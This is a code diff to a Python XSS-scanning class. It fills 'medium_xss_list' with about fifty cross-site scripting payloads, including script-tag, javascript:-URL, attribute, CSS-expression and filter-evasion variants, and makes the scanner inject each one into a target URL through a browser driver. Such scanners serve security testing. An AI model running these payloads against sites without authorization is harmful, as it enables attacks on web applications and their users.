@@ -98,17 +98,64 @@ class XssChecker(object):
 
                       ]
 
-    medium_xss_list = ['<IMG SRC=javascript:alert(\'XSS\')>',
-                       '<IMG SRC=javascript:alert("XSS")>',
-
-
-                        ]
+    medium_xss_list = [
+            "';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+            "'';!--\"<XSS>=&{()}",
+            "<IMG SRC=\"javascript:alert('XSS');\">",
+            "<IMG SRC=javascript:alert('XSS')>",
+            "<IMG SRC=javascript:alert('XSS')>",
+            "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
+            "<IMG SRC=`javascript:alert(\"is this, 'XSS'\")`>",
+            "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
+            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83)  )>",
+            "<IMG SRC=javascript:alert('XSS')>",
+            "<IMG SRC=\"jav    ascript:alert('XSS');\">",
+            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
+            "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
+            "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
+            "perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out",
+            "perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out",
+            "<IMG SRC=\"   javascript:alert('XSS');\">",
+            "<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(\"XSS\")>",
+            "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
+            "<IMG SRC=\"javascript:alert('XSS')\"",
+            "<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>",
+            "\";alert('XSS');//",
+            "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
+            "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
+            "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
+            "<BODY ONLOAD=alert('XSS')>",
+            "<IMG DYNSRC=\"javascript:alert('XSS')\">",
+            "<IMG LOWSRC=\"javascript:alert('XSS')\">",
+            "<BGSOUND SRC=\"javascript:alert('XSS');\">",
+            "<BR SIZE=\"&{alert('XSS')}\">",
+            "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
+            "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS",
+            "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
+            "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
+            "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
+            "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
+            "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
+            "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
+            "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
+            "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
+            "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
+            "<DIV STYLE=\"width: expression(alert('XSS'));\">",
+            "<STYLE>@im\port'\ja\vasc\ript:alert(\"XSS\")';</STYLE>",
+            "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
+            "<XSS STYLE=\"xss:expression(alert('XSS'))\">",
+            "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>",
+            "<BASE HREF=\"javascript:alert('XSS');//\">",
+            "<? echo('<SCR)'; echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>",
+            "<A HREF=\"http://1113982867/\">XSS</A>",
+            "<A HREF=\"http://www.google.com./\">XSS</A>"
+            ]
 
     def __init__(self, driver):
         self.driver = driver
 
     def find_xss(self, url):
-        for i in self.big_xss_list:
+        for i in self.medium_xss_list:
             xss_url = url.replace(utils.KEY, i)
             page = Page(self.driver, xss_url)
             page.open()
